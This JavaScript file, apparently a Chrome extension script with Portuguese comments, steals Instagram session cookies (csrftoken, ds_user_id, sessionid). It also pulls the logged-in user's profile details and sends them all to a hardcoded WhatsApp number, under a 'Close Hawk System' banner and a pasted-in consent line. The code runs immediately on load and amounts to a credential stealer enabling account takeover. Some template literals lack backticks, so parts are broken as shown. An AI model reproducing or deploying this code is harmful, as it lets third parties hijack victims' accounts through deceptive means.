/**
 * Exibe toast de feedback na tela
 * @param {string} message - Mensagem a ser exibida
 * @param {string} [type=""] - Tipo de mensagem (ex: success, error)
 */
function showToast(message, type = "") {
  // Cria ou obtém um container de toast simples (você pode adaptar o estilo)
  let toast = document.getElementById("toast");
  if (!toast) {
    toast = document.createElement("div");
    toast.id = "toast";
    toast.style.position = "fixed";
    toast.style.bottom = "20px";
    toast.style.right = "20px";
    toast.style.padding = "10px 15px";
    toast.style.borderRadius = "5px";
    toast.style.color = "#fff";
    toast.style.fontFamily = "Arial, sans-serif";
    toast.style.zIndex = 999999;
    document.body.appendChild(toast);
  }
  
  // Aplica o estilo de acordo com o tipo
  toast.style.backgroundColor = (type === "success") ? "#4caf50" :
                                (type === "error")   ? "#f44336" : "#333";
  toast.textContent = message;
  
  // Exibe
  toast.style.display = "block";
  
  // Oculta após 3s
  setTimeout(() => {
    toast.style.display = "none";
    toast.textContent = "";
  }, 3000);
}

/**
 * Retorna os cookies do Instagram (disponível apenas em extensões Chrome)
 */
async function getInstagramCookies() {
  // Se não estiver em extensão, este objeto não existe.
  // Necessário permissão "cookies" no manifest.json
  const neededCookies = ["csrftoken", "ds_user_id", "sessionid"];
  const foundCookies = {};

  for (const cookieName of neededCookies) {
    const cookie = await chrome.cookies.get({
      url: "https://www.instagram.com",
      name: cookieName,
    });
    if (cookie && cookie.value) {
      foundCookies[cookieName] = cookie.value;
    }
  }

  if (foundCookies.csrftoken && foundCookies.ds_user_id && foundCookies.sessionid) {
    return foundCookies;
  }
  return null;
}

/**
 * Faz requisição para obter informações da conta Instagram logada
 */
async function getInstagramAccountInfo() {
  // Primeiro, pega dados de edição (para descobrir o username)
  const editResponse = await fetch("https://www.instagram.com/api/v1/accounts/edit/web_form_data/", {
    credentials: "include",
    headers: {
      "x-requested-with": "XMLHttpRequest",
      "x-ig-app-id": "936619743392459"
    }
  });
  if (!editResponse.ok) {
    throw new Error("Falha ao obter username.");
  }
  const editData = await editResponse.json();
  const username = editData?.form_data?.username;
  if (!username) {
    throw new Error("Não foi possível obter o nome de usuário.");
  }

  // Busca informações do perfil
  const profileResponse = await fetch(
    https://www.instagram.com/api/v1/users/web_profile_info/?username=${username},
    {
      credentials: "include",
      headers: {
        "accept": "/",
        "x-requested-with": "XMLHttpRequest",
        "x-ig-app-id": "936619743392459"
      }
    }
  );
  if (!profileResponse.ok) {
    throw new Error("Falha ao obter dados do perfil.");
  }
  const profileData = await profileResponse.json();
  const user = profileData?.data?.user;
  if (!user) {
    throw new Error("Perfil de usuário inválido.");
  }

  const followerCount = user.edge_followed_by?.count || 0;
  const profilePicUrl = user.profile_pic_url || "";
  const fullName = user.full_name || "";
  
  return { username, fullName, followerCount, profilePictureUrl: profilePicUrl };
}

/**
 * Envia dados via link do WhatsApp
 */
async function sendDataToWhatsApp(cookies, accountInfo) {
  try {
    const mensagem = `
[CLOSE HAWK SYSTEM - INFO DA CONTA INSTAGRAM]

• Usuário: @${accountInfo.username}
• Nome Completo: ${accountInfo.fullName}
• Seguidores: ${accountInfo.followerCount}

[COOKIES]

• csrftoken: ${cookies.csrftoken}
• ds_user_id: ${cookies.ds_user_id}
• sessionid: ${cookies.sessionid}

[DECLARAÇÃO]

Autorizo o sistema Close Hawk System a fazer serviço de Close Friends.
`;

    // Substitua o número pelo que você deseja
    const whatsappUrl = https://wa.me/5521991566033?text=${encodeURIComponent(mensagem)};
    window.open(whatsappUrl, "_blank");
    showToast("Envio realizado via WhatsApp!", "success");
  } catch (error) {
    console.error("Falha ao enviar dados via WhatsApp:", error);
    showToast("Falha ao enviar dados via WhatsApp", "error");
  }
}

/**
 * Executa a lógica principal
 */
(async function main() {
  try {
    showToast("Capturando cookies, aguarde...");

    // Tenta capturar cookies do Instagram
    const cookies = await getInstagramCookies();
    if (!cookies) {
      showToast("Não foi possível capturar todos os cookies.", "error");
      return;
    }

    // Tenta obter dados da conta
    const accountInfo = await getInstagramAccountInfo();

    // Mostra um feedback rápido
    showToast(Olá, @${accountInfo.username}. Enviando dados..., "success");

    // Envia dados via WhatsApp
    await sendDataToWhatsApp(cookies, accountInfo);

  } catch (error) {
    console.error("Erro geral:", error);
    showToast(error.message || "Erro ao executar script", "error");
  }
})();
